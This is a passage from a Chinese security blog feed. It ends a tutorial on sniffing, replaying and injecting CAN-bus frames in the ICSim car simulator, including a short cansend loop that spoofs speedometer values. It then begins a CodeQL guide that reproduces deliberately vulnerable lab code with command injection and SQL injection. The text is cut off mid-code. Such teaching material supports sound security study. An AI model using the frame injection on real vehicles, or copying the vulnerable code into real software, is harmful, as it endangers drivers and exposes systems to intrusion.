href="#SavvyCan分析车门数据帧" class="headerlink" title="SavvyCan分析车门数据帧"></a>SavvyCan分析车门数据帧</h3><p>更为简单方法为抓取两次数据包时间稍微长一些，并查找新增数据包即可</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230712101508550.png" alt="image-20230712101508550" style="zoom:50%;"><p>通过SavvyCan来分析车门开启状态</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/car-%20control.gif" alt="car- control"></p><h3 id="SavvyCan转向数据帧分析"><a href="#SavvyCan转向数据帧分析" class="headerlink" title="SavvyCan转向数据帧分析"></a>SavvyCan转向数据帧分析</h3><p>使用分析车门的方法进行分析数据帧发现由于控制面板所模拟的噪音导致无法进行区分</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230712102409042.png" alt="image-20230712102409042" style="zoom:50%;"><p>首先使用二分法对数据包进行切割，然后使用SavvyCan分析缩小范围</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/car-control2.gif" alt="car-control2"></p><p>逐帧分析即可发现对应指令</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/car-%20control3.gif" alt="car- control3"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ol4three@ubuntu:~&#x2F;Desktop&#x2F;ICSim-master$ cat car1ab.log | grep 188#</span><br><span class="line">(1689128454.838950) vcan0 188#00000000</span><br><span class="line">(1689128455.348221) vcan0 188#02000000</span><br><span class="line">(1689128455.850390) vcan0 188#00000000</span><br><span class="line">(1689128456.354597) vcan0 188#01000000   &#x2F;&#x2F;左转向</span><br><span class="line">(1689128456.859869) vcan0 188#00000000</span><br><span class="line">(1689128457.362837) vcan0 188#02000000   &#x2F;&#x2F;右转向</span><br><span class="line">(1689128457.864604) vcan0 188#00000000</span><br><span class="line">(1689128458.375607) vcan0 188#00000000</span><br><span class="line">(1689128458.870541) vcan0 188#00000000</span><br></pre></td></tr></table></figure><h3 id="SavvyCan分析加速数据帧"><a href="#SavvyCan分析加速数据帧" class="headerlink" title="SavvyCan分析加速数据帧"></a>SavvyCan分析加速数据帧</h3><p>打开SavvyCan并添加对应的配置</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230711173307910.png" alt="image-20230711173307910"></p><p>创建好之后即可在Savvy中看到can数据包</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230711173356955.png" alt="image-20230711173356955"></p><p>可以从右窗格中剔除不需要的ID，这样，就可以快速识别相关的ID。</p><p>另一个非常好的功能是“替换模式”。如果启用此选项，将以相同的顺序替换帧。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230711173600568.png" alt="image-20230711173600568"></p><h4 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h4><p>可以使用Send Frames-&gt; Playback 使用抓取到的数据帧或者数据帧文件进行重放</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230711173723640.png" alt="image-20230711173723640"></p><h4 id="嗅探数据包"><a href="#嗅探数据包" class="headerlink" title="嗅探数据包"></a>嗅探数据包</h4><p>我们通过Sniffer对id进行筛选，查看当速度增加时其如何变化</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1rhef8ut1fgxzintrqcbjyq.gif" alt="img"></p><p>最终发现0x244就是我们要找的了，随着速度的增加，可以看到转速表显示第3和第4字节的变化（从第0个字节开始计数）</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1c5isd8-nzya3rsa59gzixw.gif" alt="img"></p><h4 id="数据发送"><a href="#数据发送" class="headerlink" title="数据发送"></a>数据发送</h4><p>同时也可以通过SavvyCan进行数据帧的发送。发送到总线0，ID 0x244（转速计），数据为0x00 0x00 0x00 0x00 0x00，并且每次将第三个字节增加1，所以在修改中，写入d3 = d3+1结果如下，可以看到我们已经找到了控制转速的数据帧</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/1urcxnv1lph3ib4hyvzeoha.gif" alt="img"></p><p>通过cansend进行验证</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ol4three@ubuntu:~&#x2F;Desktop&#x2F;ICSim-master$ cat speed-car.py </span><br><span class="line">import os</span><br><span class="line">for i in range(100):</span><br><span class="line">os.system(&quot;cansend vcan0 244#0000005000&quot;)</span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/speed-car.gif" alt="speed-car"></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;CAN相关介绍&quot;&gt;&lt;a href=&quot;#CAN相关介绍&quot; class=&quot;headerlink&quot; title=&quot;CAN相关介绍&quot;&gt;&lt;/a&gt;CAN相关介绍&lt;/h2&gt;&lt;h3 id=&quot;CAN&quot;&gt;&lt;a href=&quot;#CAN&quot; class=&quot;headerlink&quot; title=&quot;CAN&quot;&gt;&lt;/a&gt;CAN&lt;/h3&gt;&lt;p&gt;在汽车领域，CAN（Controller Area Network）是一种通信协议，用于在车辆电子系统中传输数据和命令。CAN总线是车辆中各个电子控制单元（ECU）之间进行通信的基础设施。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;控制器局域网&lt;/strong&gt;（&lt;strong&gt;CAN总线&lt;/strong&gt;）是一种&lt;a href=&quot;https://en.wikipedia.org/wiki/Vehicle_bus&quot;&gt;车辆总线&lt;/a&gt;标准，旨在允许&lt;a href=&quot;https://en.wikipedia.org/wiki/Microcontroller&quot;&gt;微控制器&lt;/a&gt;和设备在没有&lt;a href=&quot;https://en.wikipedia.org/wiki/Host_computer&quot;&gt;主机&lt;/a&gt;的情况下与彼此的应用程序通信。这是一个&lt;a href=&quot;https://en.wikipedia.org/wiki/Message-based_protocol&quot;&gt;基于消息的协议&lt;/a&gt;，最初设计用于汽车内的&lt;a href=&quot;https://en.wikipedia.org/wiki/Multiplexing&quot;&gt;多路&lt;/a&gt;电气布线，以节省铜，但它也可以在许多其他环境中使用。对于每个设备，帧中的数据是串行传输的，但如果多个设备同时传输，最高优先级的设备可以继续，而其他设备可以退出。帧由所有设备接收，包括传输设备。&lt;a href=&quot;https://en.wikipedia.org/wiki/CAN_bus&quot;&gt;^1&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在CAN问世之前，车载通信系统是通过点对点的布线系统实现的。随着车载电子元件越来越多，这种通信系统变得愈发笨重，而且维护费用非常昂贵。这时，CAN应运而生，并成为主流的车载通信系统。&lt;/p&gt;
&lt;p&gt;简单地说，CAN允许汽车中的不同电子模块相互通信并分享数据。CAN提案的主要动机是它允许多个ECU（ECU=发动机控制单元=汽车控制单元）仅用一根电缆进行通信。一辆现代汽车最多可以有70个ECU。&lt;/p&gt;
&lt;div align=&quot;center&quot;&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/1626947334_60f93f0604d9a25f766ec.png&quot; alt=&quot;img&quot; style=&quot;zoom:100%;&quot;&gt;&lt;/div&gt;
    
    </summary>
    
    
      <category term="IOT" scheme="http://www.ol4three.com/categories/IOT/"/>
    
    
      <category term="Car" scheme="http://www.ol4three.com/tags/Car/"/>
    
      <category term="CAN" scheme="http://www.ol4three.com/tags/CAN/"/>
    
  </entry>
  
  <entry>
    <title>codeql学习指南</title>
    <link href="http://www.ol4three.com/2023/04/12/WEB/Code_audit/codeql%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://www.ol4three.com/2023/04/12/WEB/Code_audit/codeql%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2023-04-12T10:25:42.000Z</published>
    <updated>2023-07-12T07:17:30.005Z</updated>
    
    <content type="html"><![CDATA[<h2 id="如何安装"><a href="#如何安装" class="headerlink" title="如何安装"></a>如何安装</h2><p><a href="https://zhuanlan.zhihu.com/p/466504018">安装codeql</a></p><h2 id="基本查询"><a href="#基本查询" class="headerlink" title="基本查询"></a>基本查询</h2><h3 id="查询结构"><a href="#查询结构" class="headerlink" title="查询结构"></a>查询结构</h3><p>查询基本包含3部分，作用与SQL查询的FROM、WHERE、SELECT部分类似。</p><table><thead><tr><th align="left">查询部分</th><th align="left">目的</th><th align="left">细节</th></tr></thead><tbody><tr><td align="left"><code>import java</code></td><td align="left">为 Java 和 Kotlin 导入标准 CodeQL 库。</td><td align="left">每个查询都以一个或多个语句开始<code>import</code>。</td></tr><tr><td align="left"><code>from MethodAccess ma</code></td><td align="left">定义查询的变量。声明的形式为： <code>&lt;type&gt; &lt;variable name&gt;</code></td><td align="left">我们用：<code>MethodAccess</code>调用表达式的变量</td></tr><tr><td align="left"><code>where ma.getMethod().hasName(&quot;equals&quot;) and ma.getArgument(0).(StringLiteral).getValue() = &quot;&quot;</code></td><td align="left">定义变量的条件。</td><td align="left"><code>ma.getMethod().hasName(&quot;equals&quot;)</code>仅限<code>ma</code>于调用方法 call <code>equals</code>。<code>ma.getArgument(0).(StringLiteral).getValue() = &quot;&quot;</code>说参数必须是文字的<code>&quot;&quot;</code>。</td></tr><tr><td align="left"><code>select ma, &quot;This comparison to empty string is inefficient, use isEmpty() instead.&quot;</code></td><td align="left">定义每次匹配报告的内容。<code>select</code>用于查找不良编码实践实例的查询语句始终采用以下形式： <code>select &lt;program element&gt;, &quot;&lt;alert message&gt;&quot;</code></td><td align="left"><code>.equals</code>使用解释问题的字符串报告生成的表达式。</td></tr></tbody></table><a id="more"></a><p>查询空字符时，效率较低，替换<code>s.equals(&quot;&quot;)</code>为<code>s.isEmpty()</code> 都会更有效率。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;java</span><br><span class="line">public class TestJava &#123;</span><br><span class="line">    void myJavaFun(String s) &#123;</span><br><span class="line">        boolean b &#x3D; s.equals(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Kotlin</span><br><span class="line">void myKotlinFun(s: String) &#123;</span><br><span class="line">    var b &#x3D; s.equals(&quot;&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Java相关语法"><a href="#Java相关语法" class="headerlink" title="Java相关语法"></a>Java相关语法</h2><h3 id="库类总结"><a href="#库类总结" class="headerlink" title="库类总结"></a>库类总结</h3><p>标准 Java 库中最重要的类可以分为五个主要类别：</p><ol><li>表示程序元素的类（例如类和方法）</li><li>表示 AST 节点的类（例如语句和表达式）</li><li>表示元数据的类（例如注释和评论）</li><li>用于计算指标的类（例如圈复杂度和耦合）</li><li>用于导航程序调用图的类</li></ol><h3 id="代码关键元素"><a href="#代码关键元素" class="headerlink" title="代码关键元素"></a>代码关键元素</h3><p>这些类表示命名的程序元素：包 ( <code>Package</code>)、编译单元 ( <code>CompilationUnit</code>)、类型 ( <code>Type</code>)、方法 ( <code>Method</code>)、构造函数 ( <code>Constructor</code>) 和变量 ( <code>Variable</code>)。</p><p>它们的共同超类是<code>Element</code>，它提供通用成员谓词来确定程序元素的名称并检查两个元素是否相互嵌套。</p><p>引用可能是方法或构造函数的元素通常很方便；类<code>Callable</code>是<code>Method</code>和的公共超类<code>Constructor</code>，可用于此目的。</p><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><p>类<code>Type</code>有许多子类来表示不同种类的类型：</p><ul><li><code>PrimitiveType</code>表示<a href="https://docs.oracle.com/javase/tutorial/java/nutsandbolts/datatypes.html">原始类型</a>，即<code>boolean</code>, <code>byte</code>, <code>char</code>, <code>double</code>, <code>float</code>, <code>int</code>, <code>long</code>,之一<code>short</code>；QL 也将<code>void</code>and <code>&lt;nulltype&gt;</code>（文字的类型<code>null</code>）归类为基本类型。</li><li>RefType表示引用（即非原始）类型；它又有几个子类：<ul><li><code>Class</code>代表一个 Java 类。</li><li><code>Interface</code>表示一个 Java 接口。</li><li><code>EnumType</code>表示 Java<code>enum</code>类型。</li><li><code>Array</code>表示 Java 数组类型。</li></ul></li></ul><p>查找程序中的所有变量</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">from Variable v</span><br><span class="line">select v</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230530085854515.png" alt="image-20230530085854515"></p><p>例如，以下查询查找<code>int</code>程序中类型的所有变量：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Variable v, PrimitiveType pt</span><br><span class="line">where pt &#x3D; v.getType() and</span><br><span class="line">    pt.hasName(&quot;int&quot;)</span><br><span class="line">select v</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230530085939736.png" alt="image-20230530085939736"></p><p>运行之后我们发现存在大量的结果，因为大多项目都包含许多类型的变量int</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">from Variable v, Class cla</span><br><span class="line">where cla &#x3D; v.getType() and cla.hasName(&quot;String&quot;)</span><br><span class="line">select v</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230530090428167.png" alt="image-20230530090428167"></p><p>运行后发现确实找到了String类型的变量</p><p>codeql也提供了非原始类型,RefType</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">from Variable v, RefType rt</span><br><span class="line">where rt&#x3D;v.getType() and rt.hasName(&quot;String&quot;)</span><br><span class="line">select v</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230530091137453.png" alt="image-20230530091137453"></p><p>引用类型也根据它们的声明范围进行分类：</p><ul><li><code>TopLevelType</code>表示在编译单元的顶层声明的引用类型。</li><li><code>NestedType</code>是在另一个类型中声明的类型。</li></ul><p>String不是基本类型，而是一个class对象，我们可以用这样的方法来查找类型为string的变量</p><p>例如，此查询查找名称与其编译单元名称不同的所有顶级类型：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from TopLevelType tl</span><br><span class="line">where tl.getName() !&#x3D; tl.getCompilationUnit().getName()</span><br><span class="line">select tl</span><br></pre></td></tr></table></figure><p>您通常会在存储库的源代码中看到这种模式，在源代码引用的文件中有更多实例。</p><p>同时在Java中还有在类中声明类的，可以用以下语查询</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">from NestedClass nc</span><br><span class="line">where nc.getASupertype() instanceof TypeObject</span><br><span class="line">select nc</span><br></pre></td></tr></table></figure><p>java中还有范型类，我们用以下语法来查询参数实例化了java.util.Map，ParameterizedType是所有参数的类型</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">from GenericInterface map, ParameterizedType pt</span><br><span class="line">where map.hasQualifiedName(&quot;java.util&quot;, &quot;Map&quot;) and</span><br><span class="line">    pt.getSourceDeclaration() &#x3D; map</span><br><span class="line">select pt</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230530093131118.png" alt="image-20230530093131118"></p><p>在程序中找到了实例化了map的参数可以用下面语法来查询</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">from Variable v, RawType rt</span><br><span class="line">where rt &#x3D; v.getType() and rt.getSourceDeclaration().hasQualifiedName(&quot;java.util&quot;, &quot;Map&quot;)</span><br><span class="line">select v</span><br></pre></td></tr></table></figure><p>getSourceDeclaration 可以获取相应泛型类型</p><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><p>在上面，我们用Variable 来查询程序中所有的类，有时需要更具体的，所以codeql提供了3个子类</p><ul><li><code>Field</code> 代表一个 Java 字段。</li><li><code>LocalVariableDecl</code> 表示局部变量。</li><li><code>Parameter</code> 表示方法或构造函数的参数。</li></ul><p>试一下Field</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230530094717609.png" alt="image-20230530094717609"></p><p>LocalVariableDecl</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230530094758208.png" alt="image-20230530094758208"></p><p>Parameter</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230530094917907.png" alt="image-20230530094917907"></p><h4 id="抽象语法树"><a href="#抽象语法树" class="headerlink" title="抽象语法树"></a>抽象语法树</h4><p>抽象语法树AST是一个程序的抽象表示模式，各种程序的语句都可以被抽象成节点，比如跳转节点，return节点，switch节点等等，通过节点还可以生成程序流程图等等，在数据流分析中十分重要。</p><p>比如跳转节点</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">from Stmt s</span><br><span class="line">where s.getParent() instanceof IfStmt</span><br><span class="line"><span class="keyword">select</span> s</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230530095137325.png" alt="image-20230530095137325"></p><h4 id="元数据"><a href="#元数据" class="headerlink" title="元数据"></a>元数据</h4><p>这里关注下注解，我们在测试springboot项目比较注意这些</p><p>比如找到方法上的所有注解</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from Method m</span><br><span class="line">select m.getAnAnnotation()</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230530095232829.png" alt="image-20230530095232829"></p><h4 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h4><p>我们可以用Call来找到所有表达式中的调用部分</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from <span class="keyword">Call</span> c</span><br><span class="line"><span class="keyword">select</span> c</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230530095309028.png" alt="image-20230530095309028"></p><p>找到所有调用了println方法的Call</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from <span class="keyword">Call</span> c, Method m</span><br><span class="line"><span class="keyword">where</span> m = c.getCallee() <span class="keyword">and</span></span><br><span class="line">    m.hasName(<span class="string">&quot;println&quot;</span>)</span><br><span class="line"><span class="keyword">select</span> c</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230530095348720.png" alt="image-20230530095348720"></p><h4 id="数据流"><a href="#数据流" class="headerlink" title="数据流"></a>数据流</h4><p>什么是数据流呢，我们在代码审计中要先找到危险函数，如readfile等。readfile入参为param，如果一个外部输入参数如：$GET[‘file’],通过一些列赋值传递给了param，这之间的通道便被称为数据流。$GET[‘file’]此类称为source，readfile此类危险函数称为sink。中间的通道被称为数据流flow，这之间还有净化函数Sanitizer，就是安全函数，在审计中比如黑白名单、类型强转等等。</p><h4 id="codeQL中的数据流"><a href="#codeQL中的数据流" class="headerlink" title="codeQL中的数据流"></a>codeQL中的数据流</h4><h5 id="本地数据流"><a href="#本地数据流" class="headerlink" title="本地数据流"></a>本地数据流</h5><p>本地数据流很好理解，就是在单个方法中的数据流。优点是快速准确。<br>在codeQl中为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DataFlow::localFlow(DataFlow::parameterNode(source), DataFlow::exprNode(sink))</span><br></pre></td></tr></table></figure><p>在我们用到的靶场中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package org.joychou.controller;</span><br><span class="line">    @GetMapping(&quot;&#x2F;ProcessBuilder&quot;)</span><br><span class="line">    public String processBuilder(String cmd) &#123;</span><br><span class="line"></span><br><span class="line">        StringBuilder sb &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            String[] arrCmd &#x3D; &#123;&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, cmd&#125;;</span><br><span class="line">            ProcessBuilder processBuilder &#x3D; new ProcessBuilder(arrCmd);</span><br><span class="line">            Process p &#x3D; processBuilder.start();</span><br><span class="line">            BufferedInputStream in &#x3D; new BufferedInputStream(p.getInputStream());</span><br><span class="line">            BufferedReader inBr &#x3D; new BufferedReader(new InputStreamReader(in));</span><br><span class="line">            String tmpStr;</span><br><span class="line"></span><br><span class="line">            while ((tmpStr &#x3D; inBr.readLine()) !&#x3D; null) &#123;</span><br><span class="line">                sb.append(tmpStr);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            return e.toString();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return sb.toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>很明显，危险函数是new ProcessBuilder(arrCmd)</p><p>我们使用下面语法来找到这个调用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">from Constructor pb, Call call</span><br><span class="line">where pb.getDeclaringType().hasQualifiedName(&quot;java.lang&quot;, &quot;ProcessBuilder&quot;) and</span><br><span class="line">    call.getCallee() &#x3D; pb</span><br><span class="line">select call.getArgument(0)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230530101150029.png" alt="image-20230530101150029"></p><p>找到了危险函数的第一个危险参数commands</p><p>我们很明显看出，危险参数由command传入，那么codeQL怎么识别呢？<br>这就要用到DataFlow库了。<br>引用方式为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import semmle.code.java.dataflow.DataFlow</span><br></pre></td></tr></table></figure><p>使用方法为:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DataFlow::localFlow(DataFlow::parameterNode(source), DataFlow::exprNode(sink)</span><br></pre></td></tr></table></figure><p>我们编写codeql代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line">from Constructor pb, Call call, Expr src</span><br><span class="line">where pb.getDeclaringType().hasQualifiedName(&quot;java.lang&quot;, &quot;ProcessBuilder&quot;) and</span><br><span class="line">    call.getCallee() &#x3D; pb and</span><br><span class="line">    DataFlow::localFlow(DataFlow::exprNode(src), DataFlow::exprNode(call.getArgument(0)))</span><br><span class="line">select src</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230530102238138.png" alt="image-20230530102238138"></p><p>我们可以找到所有流入危险函数的值</p><table><thead><tr><th align="center">名称</th><th align="center">解释</th></tr></thead><tbody><tr><td align="center">Method</td><td align="center">方法类，Method method表示获取当前项目中所有的方法</td></tr><tr><td align="center">MethodAccess</td><td align="center">方法调用类，MethodAccess call表示获取当前项目当中的所有方法调用</td></tr><tr><td align="center">Parameter</td><td align="center">参数类，Parameter表示获取当前项目当中所有的参数</td></tr></tbody></table><p>结合ql的语法，我们尝试获取项目中定义的所有方法</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">from Method method</span><br><span class="line">select method</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230530145230068.png" alt="image-20230530145230068"></p><p>我们在通过Method内置的一些方法，把结果过滤一下。比如获取名字为sayHello的方法名称</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line">from Method method</span><br><span class="line">where method.hasName(&quot;sayHello&quot;)</span><br><span class="line">select method.getName(), method.getDeclaringType()</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230530145442422.png" alt="image-20230530145442422"></p><h3 id="谓词"><a href="#谓词" class="headerlink" title="谓词"></a>谓词</h3><p>和SQL一样，where部分的查询条件如果过长，会显得很乱。CodeQL提供一种机制可以让你把很长的查询语句封装成函数。</p><p>这个函数，就叫谓词。</p><p>比如上面的案例，我们可以写成如下，获得的结果跟上面是一样的：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import java</span><br><span class="line"> </span><br><span class="line">predicate isStudent(Method method) &#123;</span><br><span class="line">exists(|method.hasName(&quot;sayHello&quot;))</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">from Method method</span><br><span class="line">where isStudent(method)</span><br><span class="line">select method.getName(), method.getDeclaringType()</span><br></pre></td></tr></table></figure><blockquote><p>语法解释</p><p>predicate 表示当前方法没有返回值。</p><p>exists子查询，是CodeQL谓词语法里非常常见的语法结构，它根据内部的子查询返回true or false，来决定筛选出哪些数据。</p></blockquote><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230530150407017.png" alt="image-20230530150407017"></p><h3 id="设置Source和Sink"><a href="#设置Source和Sink" class="headerlink" title="设置Source和Sink"></a>设置Source和Sink</h3><blockquote><p>什么是source和sink</p><p>在代码自动化安全审计的理论当中，有一个最核心的三元组概念，就是(source，sink和sanitizer)。</p><p>source是指漏洞污染链条的输入点。比如获取http请求的参数部分，就是非常明显的Source。</p><p>sink是指漏洞污染链条的执行点，比如SQL注入漏洞，最终执行SQL语句的函数就是sink(这个函数可能叫query或者exeSql，或者其它)。</p><p>sanitizer又叫净化函数，是指在整个的漏洞链条当中，如果存在一个方法阻断了整个传递链，那么这个方法就叫sanitizer。</p></blockquote><p>只有当source和sink同时存在，并且从source到sink的链路是通的，才表示当前漏洞是存在的。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230602105304812.png" alt="image-20230602105304812"></p><p>设置Source</p><p>在CodeQL中我们通过</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node src) &#123;&#125;</span><br></pre></td></tr></table></figure><p>方法来设置<code>source</code>。</p><p>思考一下，在我们的靶场系统中，source是什么？</p><p>我们使用的是<code>Spring Boot</code>框架，那么source就是http参数入口的代码参数，在下面的代码中，source就是username：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;jdbc&#x2F;vuln&quot;)</span><br><span class="line">public String jdbc_sqli_vul(@RequestParam(&quot;username&quot;) String username) &#123;</span><br><span class="line"></span><br><span class="line">    StringBuilder result &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        Connection con &#x3D; DriverManager.getConnection(url, user, password);</span><br><span class="line"></span><br><span class="line">        if (!con.isClosed())</span><br><span class="line">            System.out.println(&quot;Connect to database successfully.&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; sqli vuln code</span><br><span class="line">        Statement statement &#x3D; con.createStatement();</span><br><span class="line">        String sql &#x3D; &quot;select * from users where username &#x3D; &#39;&quot; + username + &quot;&#39;&quot;;</span><br><span class="line">        logger.info(sql);</span><br><span class="line">        ResultSet rs &#x3D; statement.executeQuery(sql);</span><br><span class="line"></span><br><span class="line">        while (rs.next()) &#123;</span><br><span class="line">            String res_name &#x3D; rs.getString(&quot;username&quot;);</span><br><span class="line">            String res_pwd &#x3D; rs.getString(&quot;password&quot;);</span><br><span class="line">            String info &#x3D; String.format(&quot;%s: %s\n&quot;, res_name, res_pwd);</span><br><span class="line">            result.append(info);</span><br><span class="line">            logger.info(info);</span><br><span class="line">        &#125;</span><br><span class="line">        rs.close();</span><br><span class="line">        con.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">        logger.error(&quot;Sorry,can&#96;t find the Driver!&quot;);</span><br><span class="line">    &#125; catch (SQLException e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    return result.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在下面的代码中，source就是cmd</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(&quot;&#x2F;ProcessBuilder&quot;)</span><br><span class="line">public String processBuilder(String cmd) &#123;</span><br><span class="line"></span><br><span class="line">    StringBuilder sb &#x3D; new StringBuilder();</span><br><span class="line"></span><br><span class="line">    try &#123;</span><br><span class="line">        String[] arrCmd &#x3D; &#123;&quot;&#x2F;bin&#x2F;sh&quot;, &quot;-c&quot;, cmd&#125;;</span><br><span class="line">        ProcessBuilder processBuilder &#x3D; new ProcessBuilder(arrCmd);</span><br><span class="line">        Process p &#x3D; processBuilder.start();</span><br><span class="line">        BufferedInputStream in &#x3D; new BufferedInputStream(p.getInputStream());</span><br><span class="line">        BufferedReader inBr &#x3D; new BufferedReader(new InputStreamReader(in));</span><br><span class="line">        String tmpStr;</span><br><span class="line"></span><br><span class="line">        while ((tmpStr &#x3D; inBr.readLine()) !&#x3D; null) &#123;</span><br><span class="line">            sb.append(tmpStr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; catch (Exception e) &#123;</span><br><span class="line">        return e.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们设置Source的代码为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br></pre></td></tr></table></figure><p>这是<code>SDK</code>自带的规则，里面包含了大多常用的Source入口。我们使用的SpringBoot也包含在其中, 我们可以直接使用。</p><h4 id="设置Sink"><a href="#设置Sink" class="headerlink" title="设置Sink"></a>设置Sink</h4><p>在CodeQL中我们通过</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line"></span><br><span class="line">  